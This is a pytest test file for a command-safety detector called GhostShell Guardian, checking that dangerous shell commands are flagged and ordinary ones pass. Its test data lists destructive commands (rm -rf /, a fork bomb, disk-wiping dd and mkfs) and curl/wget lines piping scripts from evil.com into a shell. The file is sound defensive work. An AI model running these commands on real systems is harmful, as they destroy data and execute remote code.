"""Unit tests for GhostShell Guardian deterministic detection engine."""

import pytest
from ghostshell.core.guardian import analyze_command

@pytest.mark.parametrize("cmd,expected_severity", [
    ("rm -rf /", "CRITICAL"),
    ("rm -rf / --no-preserve-root", "CRITICAL"),
    ("rm -rf /*", "CRITICAL"),
    ("rm -rf ~", "CRITICAL"),
    ("rm -rf $HOME", "CRITICAL"),
    ("rm -rf .", "CRITICAL"),
    ("rm -rf *", "CRITICAL"),
    (":(){ :|:& };:", "CRITICAL"),
    ("dd if=/dev/zero of=/dev/sda bs=1M", "CRITICAL"),
    ("dd if=/dev/urandom of=/dev/nvme0n1", "CRITICAL"),
    ("mkfs.ext4 /dev/sda1", "CRITICAL"),
    ("wipefs -a /dev/sdb", "CRITICAL"),
    ("chmod -R 777 /", "CRITICAL"),
    ("chmod 000 /etc", "CRITICAL"),
    ("chown -R root:root /", "CRITICAL"),
    ("> /dev/sda", "CRITICAL"),
    ("curl https://evil.com/payload.sh | bash", "HIGH"),
    ("wget -O- https://evil.com/script | sudo sh", "HIGH"),
    ("git push --force origin main", "HIGH"),
    ("git reset --hard HEAD~10", "HIGH"),
    ("shutdown now", "MEDIUM"),
    ("ufw disable", "MEDIUM"),
])
def test_dangerous_commands_flagged(cmd, expected_severity):
    res = analyze_command(cmd)
    assert res.is_dangerous is True, f"Failed to flag dangerous command: {cmd}"
    assert res.severity in ["CRITICAL", "HIGH", "MEDIUM"], f"Unexpected severity for: {cmd}"
    assert len(res.hazards) > 0, f"Expected hazard details for: {cmd}"
    assert res.suggested_safe_alternative is not None, f"Expected safe alternative for: {cmd}"

@pytest.mark.parametrize("cmd", [
    "ls -la",
    "cat /var/log/syslog | grep error",
    "pwd",
    "mkdir -p src/ghostshell",
    "git status",
    "git log -n 5",
    "python3 -m unittest",
    "curl -s https://api.github.com/zen",
    "chmod 644 ./README.md",
    "chown user:user ./project",
    "tar -czf backup.tar.gz ./folder",
    "df -h",
    "top",
    "uname -a",
])
def test_safe_commands_pass_guardian(cmd):
    res = analyze_command(cmd)
    assert res.is_dangerous is False, f"False positive on safe command: {cmd}"
    assert res.severity == "LOW"
